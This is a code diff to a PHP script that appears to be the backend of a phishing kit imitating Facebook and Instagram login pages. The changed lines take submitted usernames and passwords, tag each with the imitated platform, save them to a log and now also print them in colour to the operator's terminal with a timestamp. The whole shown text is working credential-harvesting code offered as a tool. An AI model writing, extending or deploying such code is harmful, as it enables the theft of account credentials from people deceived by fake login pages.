@@ -7,7 +7,20 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Determine platform
     $platform = isset($_POST['email']) ? "Facebook" : "Instagram";
 
-    // Build log entry
+    // Choose color
+    $color = $platform === "Facebook" ? "\033[34m" : "\033[35m"; // Blue or Magenta
+    $reset = "\033[0m";
+
+    // Create colored output for terminal (not saved in file)
+    $terminal_output = "{$color}==== [$platform Login] ==== {$reset}\n";
+    $terminal_output .= "Username: $user\nPassword: $pass\n";
+    $terminal_output .= "Time: " . date("Y-m-d H:i:s") . "\n";
+    $terminal_output .= "===========================\n";
+
+    // Print to terminal
+    echo $terminal_output;
+
+    // Create plain text log for saving
     $data = "==== [$platform Login] ====\n";
     $data .= "Username: $user\nPassword: $pass\n";
     $data .= "Time: " . date("Y-m-d H:i:s") . "\n";
